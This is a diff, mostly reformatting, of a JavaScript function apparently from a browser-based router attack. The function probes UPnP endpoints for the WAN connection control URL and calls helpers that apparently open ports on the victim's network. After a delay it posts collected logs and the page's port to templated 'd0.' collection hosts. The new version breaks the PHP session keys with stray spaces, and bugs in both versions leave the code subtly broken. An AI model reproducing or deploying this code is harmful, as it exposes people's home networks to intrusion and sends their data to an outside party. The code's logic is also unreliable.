@@ -218,65 +218,47 @@ function closefw() {
     xmlHttp.send(btoa(location.port));
 }
 
-function go()
-{
-	setTimeout( function(){
-		//Let's pause for a sec
-		//pausecomp(500);
-		for (index = 0; index < urls.length; index++)
-		{
-			(function(index)
-			{
-			xmlhttp[index]=new XMLHttpRequest();
-			xmlhttp[index].onreadystatechange = function ()
-			{
-				console.log('Onreadcalled Status: ' + xmlhttp[index].status);
-				if (xmlhttp[index.status]==0)
-				{
-					retrycounter++;
-					if (retrycounter == urls.length)
-					{
-						retrycounter = 0;
-						go();
-					}
-				}
-				if (xmlhttp[index].readyState==4 && xmlhttp[index].status==200)
-				{
-						console.log('Success');
-						xmlDoc = xmlhttp[index].responseXML;
-						x = xmlDoc.getElementsByTagName("service");
-						for (i=0; i < x.length; i++)
-						{
-						        y = x[i].getElementsByTagName("serviceType");
-						        if (y[0].innerHTML == ("urn:schemas-upnp-org:service:WANIPConnection:1" || "urn:schemas-upnp-org:service:WANPPPConnection:1"))
-						        {
-						                corrurl = x[i].getElementsByTagName("controlURL")[0].innerHTML;
-								schematype = y[0].innerHTML;
-								console.log('About to post message to worker Control URL: ' + corrurl);
-								opnip(intips);
-								openNet(getips[0]);
-
-						        }
-						  }
-				}
-			   };
-			try
-			{
-				xmlhttp[index].open("GET",urls[index],true);
-				xmlhttp[index].send();
-			}
-			catch(e)
-			{
-			}
-			})(index);
-
-		}
-
-	}, 0)
-	setTimeout( function() {
-		var postint = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]?>/r0.php",logs);
-
-	var bs = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"];?>/c0.html", btoa(location.port));
-
-	}, 500000);
+function go() {
+    setTimeout(function() {
+        //Let's pause for a sec
+        //pausecomp(500);
+        for (index = 0; index < urls.length; index++) {
+            (function(index) {
+                xmlhttp[index] = new XMLHttpRequest();
+                xmlhttp[index].onreadystatechange = function() {
+                    console.log('Onreadcalled Status: ' + xmlhttp[index].status);
+                    if (xmlhttp[index.status] == 0) {
+                        retrycounter++;
+                        if (retrycounter == urls.length) {
+                            retrycounter = 0;
+                            go();
+                        }
+                    }
+                    if (xmlhttp[index].readyState == 4 && xmlhttp[index].status == 200) {
+                        console.log('Success');
+                        xmlDoc = xmlhttp[index].responseXML;
+                        x = xmlDoc.getElementsByTagName("service");
+                        for (i = 0; i < x.length; i++) {
+                            y = x[i].getElementsByTagName("serviceType");
+                            if (y[0].innerHTML == ("urn:schemas-upnp-org:service:WANIPConnection:1" || "urn:schemas-upnp-org:service:WANPPPConnection:1")) {
+                                corrurl = x[i].getElementsByTagName("controlURL")[0].innerHTML;
+                                schematype = y[0].innerHTML;
+                                console.log('About to post message to worker Control URL: ' + corrurl);
+                                opnip(intips);
+                                openNet(getips[0]);
+                            }
+                        }
+                    }
+                };
+                try {
+                    xmlhttp[index].open("GET", urls[index], true);
+                    xmlhttp[index].send();
+                } catch (e) {}
+            })(index);
+        }
+    }, 0)
+    setTimeout(function() {
+        var postint = httpPost("http://d0.<?php echo $_SESSION["uid "]; echo $_SESSION["domain "]?>/r0.php", logs);
+        var bs = httpPost("http://d0.<?php echo $_SESSION["uid "]; echo $_SESSION["domain "];?>/c0.html", btoa(location.port));
+    }, 500000);
 }
